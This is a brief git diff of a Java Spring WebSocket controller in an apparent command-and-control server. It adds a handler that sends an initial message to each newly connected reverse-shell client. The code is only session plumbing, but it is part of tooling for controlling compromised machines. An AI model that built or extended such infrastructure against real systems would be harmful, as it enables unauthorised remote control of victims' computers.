@@ -1,6 +1,9 @@
 package com.mtattab.c2cServer.controller;
 
+import com.mtattab.c2cServer.model.InitialConnectionMessageModel;
 import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
+import com.mtattab.c2cServer.util.DataManipulationUtil;
+import com.mtattab.c2cServer.util.SocketUtil;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.socket.CloseStatus;
@@ -26,4 +29,13 @@ public class ReverseShellClientsHandler extends TextWebSocketHandler {
         reverseShellClientHandlerService.removeActiveSession(session);
 
     }
+
+    @Override
+    public void afterConnectionEstablished(WebSocketSession session) throws Exception {
+        super.afterConnectionEstablished(session);
+        reverseShellClientHandlerService.sendIntialMessage(session);
+
+    }
+
+
 }
